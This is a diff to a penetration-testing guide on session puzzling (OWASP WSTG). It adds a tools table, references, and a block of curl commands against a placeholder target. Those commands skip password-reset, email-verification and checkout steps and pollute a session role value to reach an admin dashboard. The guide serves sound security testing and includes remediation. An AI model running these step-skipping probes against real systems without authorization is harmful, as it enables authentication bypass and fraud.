@@ -8,8 +8,8 @@ author: cyberstrike-official
 tags: [session, cookies, csrf, token, wstg, sess]
 tech_stack: []
 cwe_ids: [CWE-200]
-chains_with: []
-prerequisites: []
+chains_with: [wstg-sess-01, wstg-sess-02]
+prerequisites: [wstg-conf-03, wstg-conf-06]
 severity_boost: {}
 ---
 
@@ -126,6 +126,44 @@ tester.test_step_manipulation()
 
 ---
 
+## Tools
+
+| Tool                 | Description               | Usage                                     |
+| --------------------- | ---------------------------- | -------------------------------------------- |
+| **Burp Suite**        | Repeater/Sequencer            | Replay and reorder multi-step flow requests |
+| **Postman**           | Flow scripting                | Chain requests, skip intermediate steps    |
+| **OWASP ZAP**         | Manual explore + Fuzzer       | Manipulate session state between flows     |
+
+---
+
+## Example Commands/Payloads
+
+```bash
+# Start a password-reset flow, then probe for protected access without
+# ever supplying the reset token (tests whether reset sets an auth-like session var)
+curl -s -c cookies.txt -X POST "https://{target}/forgot-password" -d "email=victim@example.com"
+curl -s -b cookies.txt "https://{target}/dashboard" | grep -qi "welcome" \
+    && echo "[VULN] Dashboard accessible via unfinished password-reset flow"
+
+# Start registration, then jump straight to an authenticated-only endpoint
+# skipping the email-verification step
+curl -s -c cookies.txt -X POST "https://{target}/register" -d "email=test@test.com&password=Passw0rd!"
+curl -s -b cookies.txt "https://{target}/dashboard" | grep -qi "welcome" \
+    && echo "[VULN] Access granted without completing email verification"
+
+# Jump directly to a later step in a multi-step checkout/wizard flow
+curl -s -c cookies.txt "https://{target}/checkout/start" -o /dev/null
+curl -s -b cookies.txt -X POST "https://{target}/checkout/confirm" -d "order_id=12345" \
+    | grep -qi "confirmed" && echo "[VULN] Checkout step-skip accepted"
+
+# Pollute a shared session variable name across two different flows
+curl -s -c cookies.txt -X POST "https://{target}/step1" -d "role=user"
+curl -s -b cookies.txt -X POST "https://{target}/admin/step1" -d "role=admin"
+curl -s -b cookies.txt "https://{target}/admin/dashboard"
+```
+
+---
+
 ## Remediation Guide
 
 ### Isolate Session Variables
@@ -163,6 +201,13 @@ session['password_reset'] = {
 | CWE ID      | Title                                     |
 | ----------- | ----------------------------------------- |
 | **CWE-488** | Exposure of Data Element to Wrong Session |
+
+---
+
+## References
+
+- [OWASP WSTG - Testing for Session Puzzling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling)
+- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
 
 
 ---
